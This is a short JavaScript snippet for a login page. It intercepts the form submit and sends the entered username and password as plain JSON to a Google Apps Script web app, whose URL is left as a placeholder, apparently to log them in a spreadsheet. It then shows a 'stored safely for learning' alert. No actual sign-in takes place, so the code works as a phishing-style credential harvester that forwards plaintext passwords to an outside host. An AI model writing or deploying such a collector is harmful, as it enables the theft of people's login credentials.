document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // Replace this with your Google Apps Script Web App URL
    const googleSheetURL = "YOUR_WEB_APP_URL_HERE";

    fetch(googleSheetURL, {
        method: "POST",
        body: JSON.stringify({ username: username, password: password }),
        headers: {
            "Content-Type": "application/json"
        }
    })
    .then(response => response.json())
    .then(data => {
        alert("Login info stored safely for learning!");
        document.getElementById("loginForm").reset();
    })
    .catch(error => {
        console.error("Error:", error);
        alert("There was an error sending the data.");
    });
});